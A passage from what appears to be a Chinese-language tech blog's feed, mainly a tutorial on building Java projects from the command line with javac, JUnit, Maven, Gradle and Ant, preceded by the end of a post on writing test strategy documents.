reality.</li><li><strong>Reporting tool</strong></li><li><strong>Test summary</strong><br>The ready plan must be reviewed and approved by managers, technical team leaders, business development, and software development teams. Also Test Strategy document can be updated in case some important changes occur in the course of the testing process.</li></ol><h2 id="Simple-Tips-To-Write-Test-Strategy-Document"><a href="#Simple-Tips-To-Write-Test-Strategy-Document" class="headerlink" title="Simple Tips To Write Test Strategy Document"></a>Simple Tips To Write Test Strategy Document</h2><ol><li>Include product background in the test strategy document. In the first paragraph of your test strategy document answer – Why stakeholders want to develop this project? This will help to understand and prioritize things quickly.</li><li>List all important features you are going to test. If you think some features are not part of this release then mention those features under “Features not to be tested” label.</li><li>Write down the test approach for your project. Clearly, mention what types of testing you are going to conduct?<br>i.e. Functional testing, UI testing, Integration testing, Load/Stress testing, Security testing, etc.</li><li>Answer questions like how you are going to perform functional testing? Manual or automation testing? Are you going to execute all test cases from your test management tool?</li><li>Which bug tracking tool you are going to use? What will be the process when you will find a new bug?</li><li>What are your test entry and exit criteria?</li><li>How will you track your testing progress? What metrics are you going to use for tracking test completion?</li><li>Task distribution – Define the roles and responsibilities of each team member.</li><li>What documents will you produce during and after the testing phase?</li><li>What risks do you see in Test completion?</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;Test strategy means “How you are going to test the application”. It deals with test objectives, approach, test environment, automation strategy and tools, and risk analysis with a contingency plan.&lt;/p&gt;</summary>
    
    
    
    <category term="SoftwareConstruction" scheme="https://www.fvolcano.red/categories/SoftwareConstruction/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>如何build一个Java项目（Maven、Gradle、JDK、Ant、Travis-CI）</title>
    <link href="https://www.fvolcano.red/2021/how-to-build-a-java-project/"/>
    <id>https://www.fvolcano.red/2021/how-to-build-a-java-project/</id>
    <published>2021-05-22T23:38:11.000Z</published>
    <updated>2021-05-22T23:38:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>脱离IDE，本地（Maven、Gradle、JDK、Ant）/在线（Travis-CI）build Java项目的步骤。<a id="more"></a></p><h1 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h1><ol><li><a href="https://www.dummies.com/programming/java/how-to-use-the-javac-command/">How to Use the javac Command</a></li><li><a href="https://www.softwaretestinghelp.com/multiple-ways-to-execute-junit-tests/">Multiple Ways To Execute JUnit Tests</a></li><li><a href="https://www.lambdatest.com/blog/run-junit-from-command-line/">How To Run Junit Tests From The Command Line</a></li></ol><h2 id="编译运行Java文件"><a href="#编译运行Java文件" class="headerlink" title="编译运行Java文件"></a>编译运行Java文件</h2><ul><li><p>If the Java file you specify on the command line contains a reference to another Java class that’s defined by a java file in the same folder, the Java compiler automatically compiles that class, too.</p></li><li><p>You can list more than one filename in the javac command.</p></li><li><p>You can use a wildcard to compile all the files in a folder, like this:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">javac</span> <span class="regexp">*.java</span></span><br></pre></td></tr></table></figure></li></ul><ol><li>javac MagicSquare.java</li></ol><p>错误: 找不到或无法加载主类 MagicSquare</p><p>原因: java 源文件中带有包名。</p><p>解决方案: javac 后加上完整包名，这需要退回到适当的目录：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">javac P1/MagicSquare.java</span><br></pre></td></tr></table></figure><ol start="2"><li>java P1.MagicSquare</li></ol><h2 id="运行Junit-Test-Case"><a href="#运行Junit-Test-Case" class="headerlink" title="运行Junit Test Case"></a>运行Junit Test Case</h2><ol><li>编译：javac -cp “junit-4.12.jar;.”  [P2/][JUnitProgramTest].java，还有依赖的其他外部库也要带上，用分号隔开。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Result result = JUnitCore.runClasses(JUnitProgramTest.class);</span><br><span class="line">    <span class="keyword">for</span> (Failure fail : result.getFailures()) &#123;</span><br><span class="line">        System.out.println(fail.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (result.wasSuccessful()) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;All tests finished successfully...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>The dot implies that:</strong></p><ul><li><p>The classpath already includes the current directory for the Java source files.</p></li><li><p>The JVM (Java Virtual Machine) automatically assumes that the current directory is where the source files are placed.</p></li><li><p>JVM then searches for the mentioned JUnit file name there. The filename is the last parameter given in the compile command.</p></li></ul><ol start="2"><li>运行：java -cp “junit-4.12.jar;.” org.junit.runner.JUnitCore [P2/][JUnitProgramTest]</li></ol><h1 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h1><p><a href="https://spring.io/guides/gs/maven/">Building Java Projects with Maven</a></p><ol><li>安装JDK和Maven，都添加到环境变量path。</li><li>在项目根目录中添加pom.xml</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mycompany.app<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>my-app<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 外部库依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>mvn package</li></ol><p><img src="/2021/how-to-build-a-java-project/image-20210523085814285.png" alt="image-20210523085814285"></p><ol start="4"><li><p>java -cp target/lab1-1.0.jar P1.MagicSquare</p><p><img src="/2021/how-to-build-a-java-project/image-20210523095825922.png" alt="image-20210523095825922"></p></li></ol><p>Standard project structure:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span>-app</span><br><span class="line">|<span class="comment">-- pom.xml</span></span><br><span class="line">`<span class="comment">-- src</span></span><br><span class="line">    |<span class="comment">-- main</span></span><br><span class="line">    |   `<span class="comment">-- java</span></span><br><span class="line">    |       `<span class="comment">-- com</span></span><br><span class="line">    |           `<span class="comment">-- mycompany</span></span><br><span class="line">    |               `<span class="comment">-- app</span></span><br><span class="line">    |                   `<span class="comment">-- App.java</span></span><br><span class="line">    `<span class="comment">-- test</span></span><br><span class="line">        `<span class="comment">-- java</span></span><br><span class="line">            `<span class="comment">-- com</span></span><br><span class="line">                `<span class="comment">-- mycompany</span></span><br><span class="line">                    `<span class="comment">-- app</span></span><br><span class="line">                        `<span class="comment">-- AppTest.java</span></span><br></pre></td></tr></table></figure><p>若不使用这样的文件结构，需要在pom.xml文件中指明src和test目录位置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>Lab1-1190200215<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Lab1<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;<span class="name">name</span>&gt;</span>Lab1<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">truetrue<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">truetruetrue<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">truetruetrue<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">truetruetrue<span class="tag">&lt;<span class="name">version</span>&gt;</span>4.13.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">truetruetrue<span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">truetrue<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">truetrue<span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>src<span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span></span><br><span class="line">truetrue<span class="tag">&lt;<span class="name">testSourceDirectory</span>&gt;</span>test<span class="tag">&lt;/<span class="name">testSourceDirectory</span>&gt;</span></span><br><span class="line">truetrue<span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">truetruetrue<span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">truetruetruetrue<span class="tag">&lt;<span class="name">directory</span>&gt;</span>src<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">truetruetruetrue<span class="tag">&lt;<span class="name">excludes</span>&gt;</span></span><br><span class="line">truetruetruetruetrue<span class="tag">&lt;<span class="name">exclude</span>&gt;</span>**/*.java<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">truetruetruetrue<span class="tag">&lt;/<span class="name">excludes</span>&gt;</span></span><br><span class="line">truetruetrue<span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">truetrue<span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">truetrue<span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">truetruetrue<span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">truetruetruetrue<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">truetruetruetrue<span class="tag">&lt;<span class="name">version</span>&gt;</span>3.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">truetruetruetrue<span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">truetruetruetrue    <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>utf-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">truetruetruetruetrue<span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">truetruetruetruetrue<span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">truetruetruetrue<span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">truetruetrue<span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">truetrue<span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">             UTF-8</span><br><span class="line">         <span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>附：POM 标签大全详解</p><h1 id="Gradle"><a href="#Gradle" class="headerlink" title="Gradle"></a>Gradle</h1><p><a href="https://docs.gradle.org/current/userguide/userguide.html">Gradle User Manual</a></p><ol><li>当然首先还是安装。</li><li><code>gradle init</code></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gradle init</span></span><br><span class="line"></span><br><span class="line">Select type of project to generate:</span><br><span class="line">  1: basic</span><br><span class="line">  2: application</span><br><span class="line">  3: library</span><br><span class="line">  4: Gradle plugin</span><br><span class="line">Enter selection (default: basic) [1..4] 2</span><br><span class="line"></span><br><span class="line">Split functionality across multiple subprojects?:</span><br><span class="line">   1: no - only one application project</span><br><span class="line">   2: yes - application and library projects</span><br><span class="line">Enter selection (default: no - only one application project) [1..2] 2</span><br><span class="line"></span><br><span class="line">Select implementation language:</span><br><span class="line">  1: C++</span><br><span class="line">  2: Groovy</span><br><span class="line">  3: Java</span><br><span class="line">  4: Kotlin</span><br><span class="line">  5: Scala</span><br><span class="line">  6: Swift</span><br><span class="line">Enter selection (default: Java) [1..6] 3</span><br><span class="line"></span><br><span class="line">Select build script DSL:</span><br><span class="line">  1: Groovy</span><br><span class="line">  2: Kotlin</span><br><span class="line">Enter selection (default: Groovy) [1..2] 1</span><br><span class="line"></span><br><span class="line">Select test framework:</span><br><span class="line">  1: JUnit 4</span><br><span class="line">  2: TestNG</span><br><span class="line">  3: Spock</span><br><span class="line">  4: JUnit Jupiter</span><br><span class="line">Enter selection (default: JUnit 4) [1..4]</span><br><span class="line"></span><br><span class="line">Project name (default: demo):</span><br><span class="line">Source package (default: demo):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BUILD SUCCESSFUL</span><br><span class="line">2 actionable tasks: 2 executed</span><br></pre></td></tr></table></figure><ol start="3"><li>运行测试 <code>./gradlew check</code></li><li>运行 <code>./gradlew run</code></li><li>打包（可选） <code>./gradlew build</code></li><li>上传（可选） <code>./gradlew build --scan</code></li></ol><h2 id="Gradle-与-Maven-的速度对比："><a href="#Gradle-与-Maven-的速度对比：" class="headerlink" title="Gradle 与 Maven 的速度对比："></a>Gradle 与 Maven 的速度对比：</h2><p><img src="https://gradle.org/images/gradle-vs-maven.gif" alt="img"></p><p><a href="https://docs.gradle.org/current/userguide/migrating_from_maven.html#migrating_from_maven">Migrating Builds From Apache Maven</a></p><p>Here is a list of some of the main Maven phases and the Gradle tasks that they map to:</p><ul><li><p><code>clean</code></p><p>Use the <code>clean</code> task provided by the Base Plugin.</p></li><li><p><code>compile</code></p><p>Use the <code>classes</code> task provided by the <a href="https://docs.gradle.org/current/userguide/java_plugin.html#sec:java_tasks">Java Plugin</a> and other JVM language plugins. This compiles all classes for all source files of all languages and also performs <a href="https://docs.gradle.org/current/userguide/migrating_from_maven.html#migmvn:filtering_resources">resource filtering</a> via the <code>processResources</code> task.</p></li><li><p><code>test</code></p><p>Use the <code>test</code> task provided by the Java Plugin. It runs just the unit tests, or more specifically, the tests that make up the <a href="https://docs.gradle.org/current/userguide/java_plugin.html#source_sets"><code>test</code> source set</a>.</p></li><li><p><code>package</code></p><p>Use the <code>assemble</code> task provided by the Base Plugin. This builds whatever is the appropriate package for the project, for example a JAR for Java libraries or a WAR for traditional Java webapps.</p></li><li><p><code>verify</code></p><p>Use the <code>check</code> task provided by the Base Plugin. This runs all verification tasks that are attached to it, which typically includes the unit tests, any static analysis tasks — such as <a href="https://docs.gradle.org/current/userguide/checkstyle_plugin.html#checkstyle_plugin">Checkstyle</a> — and others. If you want to include integration tests, you will have to <a href="https://docs.gradle.org/current/userguide/migrating_from_maven.html#migmvn:integration_tests">configure these manually</a>, which is a simple process.</p></li><li><p><code>install</code></p><p>Use the <code>publishToMavenLocal</code> task provided by the <a href="https://docs.gradle.org/current/userguide/publishing_maven.html#publishing_maven:tasks">Maven Publish Plugin</a>.Note that Gradle builds don’t require you to “install” artifacts as you have access to more appropriate features like <a href="https://docs.gradle.org/current/userguide/declaring_dependencies.html#sub:project_dependencies">inter-project dependencies</a> and <a href="https://docs.gradle.org/current/userguide/composite_builds.html#composite_builds">composite builds</a>. You should only use <code>publishToMavenLocal</code> for interoperating with Maven builds.Gradle also allows you to resolve dependencies against the local Maven cache, as described in the <a href="https://docs.gradle.org/current/userguide/migrating_from_maven.html#migmvn:declaring_repos">Declaring repositories</a> section.</p></li><li><p><code>deploy</code></p><p>Use the <code>publish</code> task provided by the <a href="https://docs.gradle.org/current/userguide/publishing_maven.html#publishing_maven:tasks">Maven Publish Plugin</a> — making sure you switch from the older Maven Plugin (ID: <code>maven</code>) if your build is using that one. This will publish your package to all configured publication repositories. There are also other tasks that allow you to publish to a single repository even when multiple ones are defined.Note that the Maven Publish Plugin does not publish <strong>source and Javadoc JARs</strong> <em>by default</em>, but this can easily be activated as explained in <a href="https://docs.gradle.org/current/userguide/building_java_projects.html#sec:java_packaging">the guide for building java projects</a>.</p></li></ul><h1 id="Ant"><a href="#Ant" class="headerlink" title="Ant"></a>Ant</h1><p><a href="https://ant.apache.org/manual/index.html">Ant Manual</a></p><p>example buildfile:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">name</span>=<span class="string">&quot;MyProject&quot;</span> <span class="attr">default</span>=<span class="string">&quot;dist&quot;</span> <span class="attr">basedir</span>=<span class="string">&quot;.&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line">    simple example build file</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- set global properties for this build --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;src&quot;</span> <span class="attr">location</span>=<span class="string">&quot;src&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;build&quot;</span> <span class="attr">location</span>=<span class="string">&quot;build&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dist&quot;</span> <span class="attr">location</span>=<span class="string">&quot;dist&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">target</span> <span class="attr">name</span>=<span class="string">&quot;init&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Create the time stamp --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tstamp</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Create the build directory structure used by compile --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mkdir</span> <span class="attr">dir</span>=<span class="string">&quot;$&#123;build&#125;&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">target</span> <span class="attr">name</span>=<span class="string">&quot;compile&quot;</span> <span class="attr">depends</span>=<span class="string">&quot;init&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">description</span>=<span class="string">&quot;compile the source&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Compile the Java code from $&#123;src&#125; into $&#123;build&#125; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">javac</span> <span class="attr">srcdir</span>=<span class="string">&quot;$&#123;src&#125;&quot;</span> <span class="attr">destdir</span>=<span class="string">&quot;$&#123;build&#125;&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">target</span> <span class="attr">name</span>=<span class="string">&quot;dist&quot;</span> <span class="attr">depends</span>=<span class="string">&quot;compile&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">description</span>=<span class="string">&quot;generate the distribution&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Create the distribution directory --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mkdir</span> <span class="attr">dir</span>=<span class="string">&quot;$&#123;dist&#125;/lib&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Put everything in $&#123;build&#125; into the MyProject-$&#123;DSTAMP&#125;.jar file --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jar</span> <span class="attr">jarfile</span>=<span class="string">&quot;$&#123;dist&#125;/lib/MyProject-$&#123;DSTAMP&#125;.jar&quot;</span> <span class="attr">basedir</span>=<span class="string">&quot;$&#123;build&#125;&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">target</span> <span class="attr">name</span>=<span class="string">&quot;clean&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">description</span>=<span class="string">&quot;clean up&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Delete the $&#123;build&#125; and $&#123;dist&#125; directory trees --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">delete</span> <span class="attr">dir</span>=<span class="string">&quot;$&#123;build&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">delete</span> <span class="attr">dir</span>=<span class="string">&quot;$&#123;dist&#125;&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">ant [options] [target [target2 [target3] ...]]</span><br><span class="line">Options:</span><br><span class="line">  -help, -h              print this message and exit</span><br><span class="line">  -projecthelp, -p       print project help information and exit</span><br><span class="line">  -version               print the version information and exit</span><br><span class="line">  -diagnostics           print information that might be helpful to</span><br><span class="line">                         diagnose or report problems and exit</span><br><span class="line">  -quiet, -q             be extra quiet</span><br><span class="line">  -silent, -S            print nothing but task outputs and build failures</span><br><span class="line">  -verbose, -v           be extra verbose</span><br><span 